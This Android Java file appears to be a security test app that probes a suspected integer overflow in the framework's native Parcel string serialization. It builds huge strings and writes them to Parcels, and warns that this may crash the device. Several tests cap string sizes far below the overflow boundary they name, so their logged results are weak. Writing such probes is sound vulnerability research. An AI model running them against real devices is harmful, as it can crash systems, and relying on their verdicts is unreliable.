package com.security.test.stringoverflow;

import android.app.Activity;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.LinearLayout;
import android.view.ViewGroup;
import android.graphics.Color;

/**
 * Test application for Bug #4: Buffer Overflow in Native String Serialization
 *
 * This app tests for integer overflow vulnerabilities in android_os_Parcel.cpp
 * when handling extremely long strings in UTF-8 and UTF-16 encoding.
 *
 * Expected behavior if bug exists:
 * - Native crash in system_server or app process
 * - Memory corruption
 * - Out-of-bounds write
 *
 * Expected behavior if patched:
 * - Exception thrown (IllegalArgumentException or OutOfMemoryError)
 * - Proper bounds checking prevents overflow
 */
public class MainActivity extends Activity {

    private static final String TAG = "VulnTest";
    private TextView logView;
    private StringBuilder logBuffer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        logBuffer = new StringBuilder();

        // Create UI
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 20, 20, 20);

        // Title
        TextView title = new TextView(this);
        title.setText("Bug #4: String Buffer Overflow Test");
        title.setTextSize(20);
        title.setPadding(0, 0, 0, 20);
        layout.addView(title);

        // Test buttons
        addTestButton(layout, "Test 1: Small Overflow", () -> testSmallOverflow());
        addTestButton(layout, "Test 2: Large Overflow", () -> testLargeOverflow());
        addTestButton(layout, "Test 3: UTF-8 Boundary", () -> testUTF8Boundary());
        addTestButton(layout, "Test 4: UTF-16 Overflow", () -> testUTF16Overflow());
        addTestButton(layout, "Test 5: Max Int Overflow", () -> testMaxIntOverflow());
        addTestButton(layout, "Clear Logs", () -> clearLogs());

        // Log view
        logView = new TextView(this);
        logView.setTextSize(12);
        logView.setBackgroundColor(Color.BLACK);
        logView.setTextColor(Color.GREEN);
        logView.setPadding(10, 10, 10, 10);

        ScrollView scrollView = new ScrollView(this);
        scrollView.addView(logView);
        scrollView.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            0,
            1.0f
        ));

        layout.addView(scrollView);
        setContentView(layout);

        log("=== String Buffer Overflow Vulnerability Test ===");
        log("Target: frameworks/base/core/jni/android_os_Parcel.cpp");
        log("Lines: 288-312 (writeString8), 314-338 (writeString16)");
        log("");
        log("Ready to test. Click buttons to run tests.");
        log("");
    }

    private void addTestButton(LinearLayout layout, String text, Runnable action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setOnClickListener(v -> {
            log("\n>>> Running: " + text);
            try {
                action.run();
            } catch (Throwable e) {
                log("EXCEPTION: " + e.getClass().getName() + ": " + e.getMessage());
                Log.e(TAG, "Test exception", e);
            }
        });
        layout.addView(btn);
    }

    private void log(String message) {
        logBuffer.append(message).append("\n");
        logView.setText(logBuffer.toString());
        Log.d(TAG, message);
    }

    private void clearLogs() {
        logBuffer = new StringBuilder();
        logView.setText("");
        log("Logs cleared.");
    }

    /**
     * Test 1: Small overflow test
     * Creates a string that might trigger overflow in allocLen calculation
     */
    private void testSmallOverflow() {
        log("Creating string with 10 million characters...");

        try {
            StringBuilder sb = new StringBuilder(10_000_000);
            for (int i = 0; i < 10_000_000; i++) {
                sb.append('A');
            }
            String testString = sb.toString();

            log("String created: " + testString.length() + " chars");
            log("Attempting to write to Parcel...");

            Parcel parcel = Parcel.obtain();
            long startTime = System.currentTimeMillis();

            parcel.writeString(testString);

            long endTime = System.currentTimeMillis();
            log("SUCCESS: Parcel write completed in " + (endTime - startTime) + "ms");
            log("Parcel size: " + parcel.dataSize() + " bytes");

            // Try to read it back
            parcel.setDataPosition(0);
            String readBack = parcel.readString();

            if (readBack != null && readBack.length() == testString.length()) {
                log("SUCCESS: String read back correctly");
                log("RESULT: Bug might be patched or limit not reached");
            } else {
                log("WARNING: String read back with wrong length!");
                log("RESULT: Possible memory corruption!");
            }

            parcel.recycle();

        } catch (OutOfMemoryError e) {
            log("OutOfMemoryError: " + e.getMessage());
            log("RESULT: OOM before overflow (expected on some devices)");
        } catch (Exception e) {
            log("Exception: " + e.getClass().getName() + ": " + e.getMessage());
            log("RESULT: Exception thrown (might indicate protection)");
        }
    }

    /**
     * Test 2: Large overflow test
     * Attempts to trigger overflow with very large string
     */
    private void testLargeOverflow() {
        log("Creating string with 100 million characters...");
        log("WARNING: This may crash the app or device!");

        try {
            // This is likely to cause OOM, but that's part of the test
            StringBuilder sb = new StringBuilder(100_000_000);
            for (int i = 0; i < 100_000_000; i++) {
                sb.append('A');
            }
            String testString = sb.toString();

            log("String created: " + testString.length() + " chars");
            log("Attempting to write to Parcel...");

            Parcel parcel = Parcel.obtain();
            parcel.writeString(testString);

            log("SUCCESS: Parcel write completed");
            log("RESULT: Bug might be patched");

            parcel.recycle();

        } catch (OutOfMemoryError e) {
            log("OutOfMemoryError: " + e.getMessage());
            log("RESULT: OOM before overflow");
        } catch (Exception e) {
            log("Exception: " + e.getClass().getName() + ": " + e.getMessage());
            log("RESULT: Exception thrown");
        }
    }

    /**
     * Test 3: UTF-8 boundary test
     * Tests the boundary where allocLen = len * 3 might overflow
     */
    private void testUTF8Boundary() {
        log("Testing UTF-8 encoding boundary...");
        log("Target: allocLen = GetStringUTFLength(val) can be 3x len");

        try {
            // Calculate size that would overflow when multiplied by 3
            int targetLen = Integer.MAX_VALUE / 3 + 1000;
            log("Target length: " + targetLen + " chars");
            log("Expected allocLen: " + ((long)targetLen * 3) + " (overflows to negative)");

            // This will likely OOM, but we're testing the concept
            log("Attempting to create string...");

            StringBuilder sb = new StringBuilder(Math.min(targetLen, 50_000_000));
            for (int i = 0; i < Math.min(targetLen, 50_000_000); i++) {
                sb.append('A');
            }
            String testString = sb.toString();

            log("String created: " + testString.length() + " chars");

            Parcel parcel = Parcel.obtain();
            parcel.writeString(testString);

            log("SUCCESS: Parcel write completed");
            log("RESULT: Either bug is patched or limit not reached");

            parcel.recycle();

        } catch (OutOfMemoryError e) {
            log("OutOfMemoryError: " + e.getMessage());
            log("RESULT: OOM before reaching overflow boundary");
        } catch (Exception e) {
            log("Exception: " + e.getClass().getName() + ": " + e.getMessage());
            log("RESULT: Exception thrown");
        }
    }

    /**
     * Test 4: UTF-16 overflow test
     * Tests: allocLen = len * sizeof(char16_t) overflow
     */
    private void testUTF16Overflow() {
        log("Testing UTF-16 encoding overflow...");
        log("Target: allocLen = len * 2 (sizeof char16_t)");

        try {
            // Calculate size that would overflow when multiplied by 2
            int targetLen = Integer.MAX_VALUE / 2 + 1000;
            log("Target length: " + targetLen + " chars");
            log("Expected allocLen: " + ((long)targetLen * 2) + " (overflows)");

            // Create string with unicode characters (forces UTF-16)
            log("Creating string with unicode characters...");

            StringBuilder sb = new StringBuilder(Math.min(targetLen, 30_000_000));
            for (int i = 0; i < Math.min(targetLen, 30_000_000); i++) {
                sb.append('一'); // Chinese character (requires UTF-16)
            }
            String testString = sb.toString();

            log("String created: " + testString.length() + " chars");

            Parcel parcel = Parcel.obtain();
            parcel.writeString(testString);

            log("SUCCESS: Parcel write completed");
            log("RESULT: Bug might be patched");

            parcel.recycle();

        } catch (OutOfMemoryError e) {
            log("OutOfMemoryError: " + e.getMessage());
            log("RESULT: OOM before overflow");
        } catch (Exception e) {
            log("Exception: " + e.getClass().getName() + ": " + e.getMessage());
            log("RESULT: Exception thrown");
        }
    }

    /**
     * Test 5: Maximum integer overflow
     * Attempts to trigger overflow with maximum possible values
     */
    private void testMaxIntOverflow() {
        log("Testing maximum integer overflow scenario...");
        log("This test attempts to allocate near-maximum memory");
        log("WARNING: May crash device!");

        try {
            // Try to create a string that would cause allocLen + sizeof(char) to overflow
            log("Attempting edge case allocation...");

            // We can't actually create a string this large, but we can test the concept
            // with a smaller string and observe behavior

            int testSize = 50_000_000; // 50 million chars
            StringBuilder sb = new StringBuilder(testSize);
            for (int i = 0; i < testSize; i++) {
                sb.append('X');
            }
            String testString = sb.toString();

            log("Test string created: " + testString.length() + " chars");

            // Write multiple times to stress test
            Parcel parcel = Parcel.obtain();
            for (int i = 0; i < 5; i++) {
                log("Write iteration " + (i + 1) + "...");
                parcel.writeString(testString);
            }

            log("SUCCESS: Multiple writes completed");
            log("Parcel size: " + parcel.dataSize() + " bytes");
            log("RESULT: No overflow detected");

            parcel.recycle();

        } catch (OutOfMemoryError e) {
            log("OutOfMemoryError: " + e.getMessage());
            log("RESULT: OOM during test");
        } catch (Exception e) {
            log("Exception: " + e.getClass().getName() + ": " + e.getMessage());
            log("RESULT: Exception thrown");
        }
    }
}
